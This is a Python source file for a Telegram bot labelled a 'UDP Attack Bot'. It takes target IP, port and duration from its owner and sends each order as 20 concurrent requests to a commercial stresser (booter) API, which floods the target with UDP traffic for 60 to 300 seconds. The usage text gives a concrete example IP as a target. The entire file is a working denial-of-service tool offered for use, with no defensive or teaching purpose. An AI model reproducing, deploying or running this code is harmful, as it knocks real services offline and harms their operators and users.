# app.py - UDP ONLY Attack Bot (Fixed)
import os
import logging
import asyncio
import threading
import aiohttp
import time
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 UDP Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
            if len(self.active_attacks) >= 100:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== UDP ONLY ATTACK =====
async def send_udp_attack(target, port, duration, attack_num):
    """
    UDP ONLY attack via API
    URL: https://api.susstresser.com/panel/api/api.php?key=KEY&host=HOST&port=PORT&time=TIME&method=udp
    """
    base_url = "https://api.susstresser.com/panel/api/api.php"
    
    # UDP ONLY - method is always "udp"
    params = {
        "key": API_KEY,
        "host": target,
        "port": port,
        "time": duration,
        "method": "udp"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            start_time = time.time()
            
            async with session.get(base_url, params=params, headers=headers) as response:
                elapsed = time.time() - start_time
                result_text = await response.text()
                
                # Log response for debugging
                logger.info(f"Attack {attack_num}: Status {response.status}")
                logger.info(f"Response: {result_text[:200]}")
                
                # ANY 200 response is considered success for UDP attack
                if response.status == 200:
                    return {
                        "success": True,
                        "attack_num": attack_num,
                        "method": "UDP",
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s",
                        "response": result_text[:200] if result_text else "Success"
                    }
                else:
                    return {
                        "success": False,
                        "attack_num": attack_num,
                        "method": "UDP",
                        "status": response.status,
                        "elapsed": f"{elapsed:.2f}s",
                        "response": result_text[:200] if result_text else "Failed"
                    }
                    
    except asyncio.TimeoutError:
        logger.error(f"Attack {attack_num} timed out")
        return {
            "success": False,
            "attack_num": attack_num,
            "method": "UDP",
            "error": "Timeout"
        }
    except Exception as e:
        logger.error(f"Attack {attack_num} failed: {e}")
        return {
            "success": False,
            "attack_num": attack_num,
            "method": "UDP",
            "error": str(e)
        }

# ===== 20 CONCURRENT UDP ATTACKS =====
async def send_20_concurrent_attacks(target, port, duration):
    """Launch 20 concurrent UDP attacks"""
    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
    
    tasks = []
    for i in range(1, 21):
        task = send_udp_attack(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results,
        "target": target,
        "port": port,
        "duration": duration
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await update.message.reply_text(
        f"⚡ *UDP ATTACK BOT*\n\n"
        f"🔥 Status: ONLINE\n"
        f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📊 Total Attacks: {stats['total']}\n"
        f"🎯 Method: UDP ONLY\n\n"
        f"📌 *Usage:* `/attack IP PORT TIME`\n\n"
        f"Example: `/attack 91.108.17.19 32002 60`\n\n"
        f"⚡ This launches 20 concurrent UDP attacks!\n"
        f"⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.17.19 32002 60`\n\n"
            "⚡ 20 concurrent UDP attacks!\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *UDP ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
            f"⏳ Sending UDP attacks...",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *UDP ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
            )
            
            if result.get('results'):
                response_text += f"📊 *Attack Results:*\n"
                success_count = 0
                for r in result['results'][:10]:
                    status = "✅" if r.get('success') else "❌"
                    if r.get('success'):
                        success_count += 1
                    status_code = r.get('status', 'N/A')
                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: UDP - {status_code}\n"
                
                if len(result['results']) > 10:
                    response_text += f"... and {len(result['results']) - 10} more\n"
                
                response_text += f"\n📊 Success Rate: {success_count}/{len(result['results'])}"
        else:
            response_text = (
                f"❌ *UDP ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED\n\n"
                f"💡 Check API key or connection."
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *UDP ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.17.19 32002 60`\n\n"
        "⚡ 20 concurrent UDP attacks!\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                "❌ Use: `IP PORT TIME`\n"
                "Example: `91.108.17.19 32002 60`",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Launching 20 UDP attacks on {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *UDP ATTACK SUCCESS!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🎯 Successful: `{result['successful']}/{result['total_attacks']}`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *UDP ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    await query.edit_message_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🎯 Method: UDP ONLY\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await query.edit_message_text(
        f"⚡ *UDP ATTACK BOT*\n\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total: {stats['total']}\n"
        f"🎯 Method: UDP ONLY\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ UDP ATTACK BOT")
    print("🎯 Method: UDP ONLY")
    print("⚡ 20 Concurrent Attacks")
    print("📌 /attack IP PORT TIME")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)